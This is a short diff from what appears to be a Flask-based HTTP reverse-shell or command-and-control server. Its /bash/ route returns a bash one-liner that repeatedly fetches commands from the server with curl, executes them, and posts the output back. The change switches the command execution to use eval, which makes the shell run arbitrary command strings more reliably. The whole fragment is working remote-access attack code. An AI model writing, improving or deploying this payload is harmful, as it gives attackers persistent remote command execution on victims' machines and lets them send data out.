@@ -23,7 +23,7 @@ def get_windows():
 
 @app.route('/bash/', methods=['GET'])
 def get_bash():
-    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
+    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$(eval $c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200
 
 
 @app.route('/http_reverse_shell/', methods=['GET'])
